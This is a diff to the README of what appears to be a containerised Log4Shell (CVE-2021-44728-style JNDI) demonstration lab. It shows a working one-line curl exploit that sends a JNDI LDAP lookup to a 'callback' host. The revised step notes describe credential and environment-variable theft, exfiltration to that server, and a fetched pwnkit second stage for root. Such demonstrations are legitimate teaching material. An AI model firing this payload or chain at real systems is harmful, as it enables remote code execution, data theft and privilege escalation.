@@ -44,13 +44,22 @@ docker compose up callback
 
 ```bash
 # ONE curl command triggers the entire chain:
-curl "http://victim:8081/api/products/search?q=\${jndi:ldap://callback:1389/pwnkit}"
+curl "http://victim:8080/api/products/search?q=\${jndi:ldap://callback:1389/pwnkit}"
 
 # What happens:
 # 1. Log4j does JNDI lookup → connects to LDAP server (port 1389)
 # 2. LDAP server responds with reference to ExploitPayload.class
-# 3. Victim downloads class from HTTP server (port 9999)
-# 4. Class executes: downloads pwnkit.c, compiles, runs → root
+# 3. Victim downloads the class from the HTTP server (port 9999); its static
+#    initializer runs automatically → recon + credential/env-var theft +
+#    exfiltration to this server, all logged in the victim's own container log
+# 4. If the victim process is already root (Dockerfile.root), nothing more to
+#    escalate. If it's running as a non-root user with `pkexec` + `gcc`
+#    present (Dockerfile.escalation), the payload fetches and runs
+#    /exploits/pwnkit.sh from this server as a second stage — an attempt at
+#    CVE-2021-4034, not a guaranteed win. Whether it works depends entirely on
+#    whether the target's policykit-1 package is patched; against a current
+#    apt mirror it will correctly report failure, which is itself the point:
+#    the OS package layer, not just the Java library, has to be out of date.
 ```
 
 ## Conference Presentation
